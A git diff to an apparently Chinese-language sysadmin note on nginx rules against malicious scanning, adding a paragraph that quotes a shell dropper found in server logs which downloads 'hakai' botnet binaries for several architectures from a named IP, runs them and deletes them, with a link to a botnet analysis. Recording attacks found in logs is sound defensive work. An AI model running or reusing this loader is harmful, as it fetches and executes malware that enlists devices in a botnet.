@@ -907,6 +907,26 @@ location ~ (\.php$|myadmin) {
 
 至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。
 
+后来在日志里面查到这样一个脚本，最终发现下载了一大堆binary file。
+```shell
+#!/bin/sh
+n="hakai.mips hakai.arm5 hakai.mpsl hakai.x86_64"
+http_server="46.166.185.42"
+
+for a in $n
+do
+    wget http://$http_server/$a -O -> /tmp/$a
+    chmod 777 /tmp/$a
+    /tmp/$a
+done
+
+for a in $n
+do
+    rm -rf /tmp/$a
+done
+```
+
+
 [这里有详细的解说](http://blog.netlab.360.com/a-new-threat-an-iot-botnet-scanning-internet-on-port-81-en/)
 
 [然而nginx是没法在配置文件里面去match上一个queryParameter的](https://serverfault.com/questions/879329/why-does-nginx-select-a-location-block-with-a-non-matching-regex)
